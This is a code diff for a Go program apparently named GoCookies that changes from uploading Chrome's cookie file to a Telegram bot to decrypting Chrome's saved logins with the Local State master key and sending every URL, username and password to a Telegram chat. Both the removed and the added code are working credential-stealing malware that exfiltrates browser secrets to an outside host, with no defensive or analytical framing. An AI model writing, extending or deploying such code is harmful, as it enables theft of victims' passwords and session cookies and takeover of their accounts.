@@ -1,15 +1,12 @@
 package main
 
 import (
-	"bytes"
 	"fmt"
-	"io"
 	"log"
-	"mime/multipart"
-	"net/http"
-	"os"
-	"path/filepath"
 	"GoCookies/browsers"
+	"bytes"
+	"net/http"
+	"encoding/json"
 )
 
 const (
@@ -21,84 +18,72 @@ func main() {
 	// Get the available Chromium-based browsers and their paths
 	browsersMap := browsers.GetChromiumBrowsers()
 
-	// Assuming you want to use Chrome; you can modify to choose another browser
-	chromeProfilePath := browsersMap["Chrome"]
-	if chromeProfilePath == "" {
-		log.Fatalf("Chrome profile path not found in the map")
+	// Get the paths for Chrome's Local State and Login Data
+	chromeLocalStatePath := browsersMap["Chrome Local State"]
+	chromeLoginDataPath := browsersMap["Chrome Login Data"]
+
+	// Ensure the paths are found
+	if chromeLocalStatePath == "" || chromeLoginDataPath == "" {
+		log.Fatalf("Chrome Local State or Login Data path not found in the map")
 	}
 
-	// Define the path to the Chromium Cookies file
-	cookiesFilePath := filepath.Join(chromeProfilePath, "Network", "Cookies")
-
-	// Check if the cookie file exists
-	if _, err := os.Stat(cookiesFilePath); os.IsNotExist(err) {
-		log.Fatalf("Cookies file does not exist at path: %s", cookiesFilePath)
-	}
-
-	log.Printf("Found cookies file at: %s", cookiesFilePath)
-
-	// Send the cookies file to Telegram
-	err := sendFileToTelegram(cookiesFilePath)
+	// Get the master key for decryption using the Local State file
+	var chromium browsers.Chromium
+	err := chromium.GetMasterKey(chromeLocalStatePath)
 	if err != nil {
-		log.Fatalf("Failed to send cookies file to Telegram: %v", err)
+		log.Fatalf("Failed to get master key: %v", err)
 	}
 
-	fmt.Println("Cookies file sent successfully!")
+	// Get the logins (username, password, and URL) from the Login Data file
+	logins, err := chromium.GetLogins(chromeLoginDataPath)
+	if err != nil {
+		log.Fatalf("Failed to get logins: %v", err)
+	}
+
+	// Format the login details into a string message
+	var message string
+	for _, login := range logins {
+		message += fmt.Sprintf("URL: %s\nUsername: %s\nPassword: %s\n\n", login.LoginURL, login.Username, login.Password)
+	}
+
+	// If no logins are found, send a message stating no logins were found
+	if message == "" {
+		message = "No logins found."
+	}
+
+	// Send the message to Telegram
+	err = sendMessageToTelegram(message)
+	if err != nil {
+		log.Fatalf("Failed to send message to Telegram: %v", err)
+	}
 }
 
-// sendFileToTelegram uploads the cookies file to Telegram
-func sendFileToTelegram(filePath string) error {
-	telegramURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", botToken)
+// sendMessageToTelegram sends a message to a specified Telegram chat.
+func sendMessageToTelegram(message string) error {
+	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
+	payload := map[string]interface{}{
+		"chat_id": chatID,
+		"text":    message,
+	}
 
-	// Open the cookie file
-	fileContent, err := os.Open(filePath)
+	// Convert the payload to JSON
+	jsonData, err := json.Marshal(payload)
 	if err != nil {
-		return fmt.Errorf("failed to open file: %v", err)
-	}
-	defer fileContent.Close()
-
-	// Create the multipart form data
-	body := &bytes.Buffer{}
-	writer := multipart.NewWriter(body)
-
-	// Add the chat_id field
-	if err := writer.WriteField("chat_id", chatID); err != nil {
-		return fmt.Errorf("failed to write chat_id field: %v", err)
+		return fmt.Errorf("failed to marshal JSON payload: %v", err)
 	}
 
-	// Add the file field
-	fileField, err := writer.CreateFormFile("document", filepath.Base(filePath))
+	// Send the POST request to Telegram's API
+	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
-		return fmt.Errorf("failed to create file field: %v", err)
-	}
-
-	// Copy the file content to the form field
-	if _, err := io.Copy(fileField, fileContent); err != nil {
-		return fmt.Errorf("failed to copy file content: %v", err)
-	}
-
-	writer.Close()
-
-	// Send the POST request
-	req, err := http.NewRequest("POST", telegramURL, body)
-	if err != nil {
-		return fmt.Errorf("failed to create HTTP request: %v", err)
-	}
-	req.Header.Set("Content-Type", writer.FormDataContentType())
-
-	client := &http.Client{}
-	resp, err := client.Do(req)
-	if err != nil {
-		return fmt.Errorf("failed to send HTTP request: %v", err)
+		return fmt.Errorf("failed to send POST request to Telegram: %v", err)
 	}
 	defer resp.Body.Close()
 
+	// Check if the request was successful
 	if resp.StatusCode != http.StatusOK {
-		// Read the response body to log the error
-		respBody, _ := io.ReadAll(resp.Body)
-		return fmt.Errorf("failed to send document: %s, Response: %s", resp.Status, string(respBody))
+		return fmt.Errorf("received non-OK response from Telegram API: %v", resp.Status)
 	}
 
-	log.Printf("File sent successfully with status: %s", resp.Status)
+	log.Printf("Message sent successfully to Telegram!")
 	return nil
 }
